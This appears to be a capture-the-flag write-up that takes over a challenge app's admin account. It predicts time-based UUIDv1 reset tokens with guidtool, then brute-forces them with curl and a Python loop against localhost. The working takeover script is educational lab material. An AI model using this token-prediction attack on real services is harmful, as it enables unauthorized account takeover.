# I need a GUIDe



## Objective

We need to get the `admin` account 

## Route mapping

After exploring the possiblities, we can see that we're able to:

Create an account (POST /register)
Login (POST /login)

Create a "one time link connection" (GET /reset_token/:username)

And use this token to connect (GET /connect/:token)
This route set our cookie with a jwt token and redirect us to `/`

## Idea
We're going to connect as `admin` user, with a one time token.

When we try to generate a link for user `admin`, token is not sent in the form. So, we need to guess the token

## Token analyse

This token look like an GUID (and the hint chall name can confirm it)

Let's analyse it with guidtool

```sh
~guidtool -i e088e200-934f-11ed-a74e-bf2986d3b4e9
UUID version: 1
UUID time: 2023-01-13 14:37:59.712000
UUID timestamp: 138929134797120000
UUID node: 210185076585705
UUID MAC address: bf:29:86:d3:b4:e9
UUID clock sequence: 10062
```

We are facing a GUID version 1. It's a time based generation. And it's also predictable

## Exploit

We're going to generate a link for user admin and predict the token

First, we need to generate a token for our user. I've created a user before, `eteck`

`curl http://localhost:4000/reset_token/eteck`
```
{"message":"success","for_user":"eteck","info":"noEmail","token":"cf7dfa80-9350-11ed-a74e-bf2986d3b4e9","generatedAt":"2023-01-13 14:44:40"}
```

Token generated: cf7dfa80-9350-11ed-a74e-bf2986d3b4e9

Then, let's generated a token for `admin`

`curl http://localhost:4000/reset_token/admin`
```
{"message":"success","for_user":"admin","info":"email","generatedAt":"2023-01-13 14:44:53"}
```

Since the user `admin` has an email, the token is not returned in the response.

There is the exact generation time in the response: 2023-01-13 14:44:53

We're going to use guidtool to generate token for this date. more info: https://github.com/intruder-io/guidtool#creating-guids

`guidtool -t '2023-01-13 14:44:53' cf7dfa80-9350-11ed-a74e-bf2986d3b4e9 > tokens.txt`

We need to test all the generated token, until we found the admin token

note: if the token is not present, we can try again this exploit or use the param `-p` in guidtool command, to generate more token

```python
import requests

f = open("tokens.txt", "r")
for line in f:
    token = line.strip()
    r = requests.get(f'http://localhost:4000/connect/{token}')
    if r.status_code != 401:
        print(r.cookies) # jwt token is in the cookie
        exit()
```